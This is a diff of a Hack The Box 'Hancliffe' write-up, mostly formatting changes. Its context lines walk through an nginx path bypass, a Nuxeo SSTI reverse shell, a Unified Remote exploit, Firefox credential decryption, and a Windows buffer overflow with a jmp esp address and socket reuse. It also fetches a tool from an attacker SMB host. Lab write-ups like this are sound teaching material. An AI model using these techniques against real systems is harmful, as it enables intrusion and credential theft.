@@ -13,10 +13,13 @@ categories:
   - infosec
 tags:  
   - windows
-  - mysql
-  - mattermost
-  - hashcat
-  - rules
+  - hard
+  - nginx parser logic
+  - firefox profile
+  - reversing
+  - buffer overflow
+  - socket reuse
+  - aslr 
 ---
 
 ![](/assets/images/htb-writeup-hancliffe/hancliffe_logo.png){: style="float: right; width: 200px; margin-left: 2em"}
@@ -108,7 +111,7 @@ Username or Password incorrect
 
 **PORT 80:**
 - Visiting http://10.10.11.115/maintenance/ -> 302 Moved /**nuxeo**/Maintenance/
-	- Which is probably [nuxeo web ui](https://github.com/nuxeo/nuxeo-web-ui) but unable to fuzz the directory
+- Which is probably [nuxeo web ui](https://github.com/nuxeo/nuxeo-web-ui) but unable to fuzz the directory
 
 
 **PORT 8000:**
@@ -118,17 +121,17 @@ Username or Password incorrect
 ----------
 
 ### Step 2
-From our inital checks we found that GET requests on port 80 to `/maintenance/` got 302 Moved to `/nuxeo/Maintenance`, which is odd. Playing some more we find that ..
+From our inital checks we found that GET requests on port 80 to `/maintenance/` got 302 Moved to `/nuxeo/Maintenance`, which is interesting. Playing some more we find that ..
 
-.. GET `/maintenance/..;/index.jsp` -> 302 Moved `/nuxeo/nxstartup.faces`
-.. GET `/maintenance/..;/nuxeo/nxstartup.faces` -> 302 Moved `/nuxeo/login.jsp`
+.. GET `/maintenance/..;/index.jsp` -> 302 Moved `/nuxeo/nxstartup.faces`<br>
+.. GET `/maintenance/..;/nuxeo/nxstartup.faces` -> 302 Moved `/nuxeo/login.jsp`<br>
 .. GET `/maintenance/..;/login.jsp` -> **200 Found**
 
 We have a login prompt, but no credentials. A quick google and the second result we find is a [authentication bypass rce](https://github.com/mpgn/CVE-2018-16341), which leverages SSTI. 
 
 To see if the target is vulnerable to SSTI we can use this simple test string:
 
-![[Pasted image 20211213154541.png]]
+![](/assets/images/htb-writeup-hancliffe/hancliffe01.png)
 
 Using [revshell.com](https://revshells.com) we generate a PowerShell #3 (Base64) shell as payload and trigger full SSTI RCE:
 
@@ -205,7 +208,7 @@ Active Connections
   TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       656
 ```
 
-Uploading winPEAS.exe to `C:\Windows\Temp` gives nothing, probably defender or applocker blocking it. But we are able to copy files from a localy hosted SMB share to `C:\Windows\Tasks`.
+Uploading winPEAS.exe to `C:\Windows\Temp` gives nothing, probably defender or applocker blocking it. But `C:\Windows\Tasks` works just fine.
 ```powershell
 PS C:\Windows\Tasks> copy \\10.10.14.8\share\wp.exe .
 PS C:\Windows\Tasks> dir
@@ -237,9 +240,9 @@ Interesting output from WinPEAS:
 
 ### Step 4
 Going through all output we find that port 9510 and 9512 (Unified Remote 3) sounds interesting.
-```ad-quote
-Unified Remote is a **software that lets you use your mobile phone** (Android, iOS, or Windows Phone) to control every aspect of your computer: from handling your keyboard and mouse to managing files on your hard drive.
-```
+
+>"Unified Remote is a **software that lets you use your mobile phone** (Android, iOS, or Windows Phone) to control every aspect of your computer: from handling your keyboard and mouse to managing files on your hard drive."
+
 ```bash
 ┌──(void㉿void)-[/htb/hancliffe]
 └─$ searchsploit "unified remote 3"                                                                                                                       1 ⨯
@@ -309,7 +312,7 @@ except:
 	SendString("C:\\Windows\\Temp\\" + payload, rhost) # Execute Payload
 ```
 
-I struggled with this part for about three hours and modified my script to look like this instead:
+I struggled with this part for a while but in the end modified my script to look like this:
 ```powershell
 # User Specified arguments
 try:
@@ -460,9 +463,9 @@ To understand what the `firefox_decrypt` output actually means we can have a clo
 - `"usernameField":"website"`
 - `"passwordField":"masterpassword"`
 
-From this we are missing one input parameter from the Stageless Password Manager on port 8000, Full Name, but looking on the password (and in `C:\Users\`) we can guess that it should be `development`. Using all found parameters we get the generated password `AMl.q2DHp?2.C/V0kNFU`.
+From this we are missing one input parameter from the Stageless Password Manager on port 8000, Full Name. Looking on the password (`#@H@ncLiff3D3velopm3ntM@st3rK3y*!`) and in `C:\Users\` we can guess that it belongs to user `development`. Using all found parameters we get the generated password `AMl.q2DHp?2.C/V0kNFU`.
 
-![[Pasted image 20220107103051.png]]
+![](/assets/images/htb-writeup-hancliffe/hancliffe02.png)
 
 Trying to change user with the standard PS ScriptBlock gives no output:
 ```powershell
@@ -508,7 +511,7 @@ hancliffe\development
 --------------
 
 ### Step 3
-Next step is pretty obvious, we need to break the application on port 9999 some how to gain a root shell. And looking in C:\DevApp we find the source:
+Next step is pretty obvious, we need to break the application on port 9999 some how to gain a root shell. And looking in `C:\DevApp` we find the source:
 ```powershell
 *Evil-WinRM* PS C:\DevApp> ls
 
@@ -539,13 +542,13 @@ Download `MyFirstApp.exe` and start analyze it!
 In Ghidra we find a few interesting things..
 
 .. a login function containing username and a base64 encoded password in clear text
-![[Pasted image 20220107141328.png]]
+![](/assets/images/htb-writeup-hancliffe/hancliffe03.png)
 
-.. encryption function `encrypt1`
-![[Pasted image 20220111121216.png]]
+.. encryption function `encrypt1`<br>
+![](/assets/images/htb-writeup-hancliffe/hancliffe04.png)
 
-.. encryption function `encrypt2`
-![[Pasted image 20220111120346.png]]
+.. encryption function `encrypt2`<br>
+![](/assets/images/htb-writeup-hancliffe/hancliffe05.png)
 
 Working our way backwards with the **login function** we can see that.. 
 
@@ -566,8 +569,10 @@ ayXx;ll?|x;lZk9K%
 
 Trying to understand the functions to 100% I decided to replicate the code in Python. After being stuck for a good while I got a hint, the password to the executable is **`K3r4j@@nM4j@pAh!T`**. With this we know that after running the password through the encryption algorithms, we should ge the product `ayXx;ll?|x;lZk9K%`, which is a huge guidance.
 
+With encryption knowledge you should/could have picked up that `enc1` is actually just ROT47 and `enc2` Atbash cipher and instantly solve this issue with [CyberChef](https://gchq.github.io/CyberChef/). I did not know this..
+
 After **days** of troubleshooting I finally was finally able to find a massive error, from Ghidra. In the disasembly `0x61` was some how translated to `0x9f` in the code, making all my calculation incorrenct.
-![[Pasted image 20220112124309.png]]
+![](/assets/images/htb-writeup-hancliffe/hancliffe06.png)
 
 
 After fixing this I was able to replicate the encryption algorithms.
@@ -634,8 +639,8 @@ CORR: [97, 121, 88, 120, 59, 108, 108, 63, 124, 120, 59, 108, 90, 107, 57, 75, 3
 ```
 
 
-Looking for strings in the binary we find a few more interesting lines that might be usefull later.
-![[Pasted image 20220107130131.png]]
+Looking for strings in the binary we find a few more interesting lines that might be usefull later.<br>
+![](/assets/images/htb-writeup-hancliffe/hancliffe07.png)
 
 
 -------
@@ -765,7 +770,7 @@ Fuzzing with 100 bytes
 Could not connect to 172.30.1.118:9086
 ```
 
-![[Pasted image 20220112120514.png]]
+![](/assets/images/htb-writeup-hancliffe/hancliffe08.png)
 
 -----
 
@@ -835,7 +840,7 @@ Sending evil buffer...
 Done!
 ```
 
-![[Pasted image 20220112121932.png]]
+![](/assets/images/htb-writeup-hancliffe/hancliffe09.png)
 
 The EIP value is now **41326341**. Find the exact offset of the crash with either Mona or Metasploit:
 ```bash
@@ -849,9 +854,9 @@ The EIP value is now **41326341**. Find the exact offset of the crash with eithe
 [*] Exact match at offset 66
 ```
 
-Modify the `bof.py` and ..
-.. set **offset** variable to 66
-.. set **retn** varible to "BBBB"
+Modify the `bof.py` and ..<br>
+.. set **offset** variable to 66<br>
+.. set **retn** varible to "BBBB"<br>
 .. clear the payload variable
 
 ```bash
@@ -864,8 +869,8 @@ padding = ""
 payload = ""
 ```
 
-Run `bof.py` again and the EIP should now be equal to **42424242**, the hex value of "BBBB", meaning we controll EIP.
-![[Pasted image 20220112122842.png]]
+Run `bof.py` again and the EIP should now be equal to **42424242**, the hex value of "BBBB", meaning we controll EIP.<br>
+![](/assets/images/htb-writeup-hancliffe/hancliffe10.png)
 
 -----
 
@@ -880,7 +885,7 @@ b += '\x43' * 500
 
 If we load `MyFirstApp.exe` in x64dbg and fire the exploit, we see that at the point of crash, the stack pointer [`$esp`] is pointing to the area that directly follows the EIP overwrite - `0x0101FF18`.
 
-![[Pasted image 20220113161832.png]]  ![[Pasted image 20220113162120.png]]
+![](/assets/images/htb-writeup-hancliffe/hancliffe11.png)  ![](/assets/images/htb-writeup-hancliffe/hancliffe12.png)
 
 Although we sent a total of 500 bytes in this position, this has been heavily truncated to only 10 bytes. This is a big problem, as this won’t suffice for the operations we wish to carry out. However, we do have the full 66 byte `\x41` island that precedes the EIP overwrite at our disposal. As long as we can pass execution into the 10 byte island that follows the overwrite, we can do a short jump back into the 66 byte island.
 
@@ -888,34 +893,32 @@ As the `$esp` register is pointing at the 10 byte island, the first thing we nee
 
 In **x64dbg**, we can do this by inspecting the `Memory Map` tab and looking at what DLLs are being used. We find 5 DLL's; `msvcrt.dll`, `kernelbase.dll`, `kernel32.dll`, `ws2_32.dll` & `ntdll.dll`. Take note of their respective base address, go to `Log` and run the command `imageinfo <base-dll-address>` to retrieve information from the PE header. If the `DLL Characteristics` flag is set to 0, no protection such as ASLR or DEP are enabled. 
 
-````ad-note
-This step can also be done in Immunity using Mona and is **much simpler**, just write: 
-`!mona modules`
 
-![[Pasted image 20220112151307.png]]
+>This step can also be done in Immunity using Mona and is **much simpler**, just write: 
+>`!mona modules`
+>
+>![](/assets/images/htb-writeup-hancliffe/hancliffe13.png)
 
-````
+
 
 Unfortunate for us, all DLL's are protected and we have to bypass ASLR somehow. We have two options..
 
-.. find a JMP ESP within the EXE itself.
+.. find a JMP ESP within the EXE itself.<br>
 .. create your own malicious DLL and inject it into the program.
 
 The easiest of the two would be to find a jump point within the EXE, so lets go with that.
 
 In **x64dbg** go to `Memory Map` tab and double click on the memory section marked as executable (`E` in Protection column) for myfirstapp.exe; `.text` in this case.
 
-![[Pasted image 20220113165949.png]]
+![](/assets/images/htb-writeup-hancliffe/hancliffe14.png)
 
 We are sent to the `CPU` tab, here press `CTRL+F` and search for `JMP ESP` and we find 5 jump points.
-![[Pasted image 20220113170140.png]]
+![](/assets/images/htb-writeup-hancliffe/hancliffe15.png)
 
-```ad-note
-This can also be done in Immunity using Mona by writing:
-`!mona jmp -r esp -cpb "\x00"`
-
-![[Pasted image 20220112153501.png]]
-```
+>This can also be done in Immunity using Mona by writing:
+>`!mona jmp -r esp -cpb "\x00"`
+>
+>![](/assets/images/htb-writeup-hancliffe/hancliffe16.png)
 
 Save the first address, `0x7190239F`. Now that we have an address of a `jmp esp` instruction that will take us to the 10 byte island after the EIP overwrite, we can replace `\x42\x42\x42\x42` in our exploit with said address (keep in mind, this needs to be in reverse order due to the use of little endian).
 
@@ -958,19 +961,19 @@ Before running the exploit again, set a breakpoint at our `jmp esp` instruction.
 
 If we now run the exploit again, we will hit the breakpoint and after stepping into the call (blue arrow pointing down on a dot), we will be taken to our 10 byte island of `0x43`, meaning we control execution. 
 
-![[Pasted image 20220113172107.png]]
+![](/assets/images/htb-writeup-hancliffe/hancliffe17.png)
 
 Next we need to jump back to the start of the 66 byte island as mentioned earlier. To do this, we can use a short jump to go backwards. Rather than calculating the exact offset manually, x64dbg can do the heavy lifting for us here!
 
 If we scroll up the `CPU` tab to find the start of the 66 byte island containing the `\x41` bytes, we can see there is a `0x41` at `0x00FCFED4` and also two which directly precede that.
 
-![[Pasted image 20220113172419.png]]
+![](/assets/images/htb-writeup-hancliffe/hancliffe18.png)
 
 We cannot copy the address of the first 2 bytes, but we can instead subtract 2 bytes from `0x00FCFED4` to get the address `0x00FCFED2`. Now, if we go back to where `$esp` is pointing (`0x00FCFF15`) and press the space bar whilst the instruction is highlighted, we will enter the `Assemble` screen.
 
 In here, we can enter `jmp 0x00FCFED2`, hit `OK` and it will automatically calculate the distance and create a short jump for us; in this case, `EB BB`. If everything went correct you should now have a red arrow pointing up to the start of the `\x41` island. You can also verify this by pressing `G`.
 
-![[Pasted image 20220113173311.png]]
+![](/assets/images/htb-writeup-hancliffe/hancliffe19.png)
 
 We can now update the exploit to include this instruction before the `\x43` island that was previously in place and replace the remaining bytes in both the 66 byte and 10 byte islands with NOP sleds so that we can work with them a bit easier later when we are assembling our exploit in the debugger.
 
@@ -1010,8 +1013,8 @@ except:
     print("Could not connect.")
 ```
 
-If we execute the exploit again, we will now find ourselves in the 66 byte NOP sled that precedes the initial EIP overwrite:
-![[Pasted image 20220113175039.png]]
+If we execute the exploit again, we will now find ourselves in the 66 byte NOP sled that precedes the initial EIP overwrite:<br>
+![](/assets/images/htb-writeup-hancliffe/hancliffe20.png)
 
 ---------------
 
@@ -1019,7 +1022,7 @@ If we execute the exploit again, we will now find ourselves in the 66 byte NOP s
 The first thing we need to do before we can start putting together any code is to figure out where we can **find the socket** that the data our exploit is sending is being received on.
 Restart the application and set a break point at the either the `recv` or `call eax` funtions under the string `Input Your Code: `, in my case that is `0x71901D79`.
 
-![[Pasted image 20220118091512.png]]
+![](/assets/images/htb-writeup-hancliffe/hancliffe21.png)
 
 At the breakpoint we can see a few interesting things;
 
@@ -1286,24 +1289,24 @@ type C:\Users\Administrator\Desktop\root.txt
 ------
 
 # References
-**nginx parser logic:**
-https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
+**nginx parser logic:**<br>
+<https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf>
 
-**nuxeo authentication bypass rce:**
-https://github.com/mpgn/CVE-2018-16341
+**nuxeo authentication bypass rce:**<br>
+<https://github.com/mpgn/CVE-2018-16341>
 
-**firefox decrypt:**
-https://github.com/unode/firefox_decrypt
+**firefox decrypt:**<br>
+<https://github.com/unode/firefox_decrypt>
 
-**ascii, hex, bin, dec, converter**:
-https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html
+**ascii, hex, bin, dec, converter:**<br>
+<https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html>
 
-**buffer overflow:**
-https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/
-https://liodeus.github.io/2020/08/11/bufferOverflow.html
-https://0xrick.github.io/binary-exploitation/bof5/
-https://security.stackexchange.com/questions/236956/buffer-overflow-mona-modules-all-show-rebase-safeseh-aslr-true
-https://blog.devgenius.io/buffer-overflow-tutorial-part4-1e80e90a2f03
-https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/buffer-overflow
-https://snowscan.io/htb-writeup-bighead/#
-http://mislusnys.github.io/post/htb-bighead/
+**buffer overflow:**<br>
+<https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/><br>
+<https://liodeus.github.io/2020/08/11/bufferOverflow.html><br>
+<https://0xrick.github.io/binary-exploitation/bof5/><br>
+<https://security.stackexchange.com/questions/236956/buffer-overflow-mona-modules-all-show-rebase-safeseh-aslr-true><br>
+<https://blog.devgenius.io/buffer-overflow-tutorial-part4-1e80e90a2f03><br>
+<https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/buffer-overflow><br>
+<https://snowscan.io/htb-writeup-bighead/#><br>
+<http://mislusnys.github.io/post/htb-bighead/><br>
